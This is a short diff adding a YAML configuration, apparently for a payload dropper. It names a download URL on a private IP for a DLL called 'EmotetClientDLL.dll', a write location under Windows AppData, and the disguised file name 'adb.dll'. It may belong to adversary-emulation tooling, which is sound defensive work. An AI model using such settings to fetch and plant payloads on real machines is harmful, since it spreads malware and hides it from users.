@@ -1,0 +1,5 @@
+---
+
+url_to_payload: "https://192.168.0.4/getFile/EmotetClientDLL.dll"
+directory_to_write_payload: "$env:AppData\\"
+payload_file_name: "adb.dll"
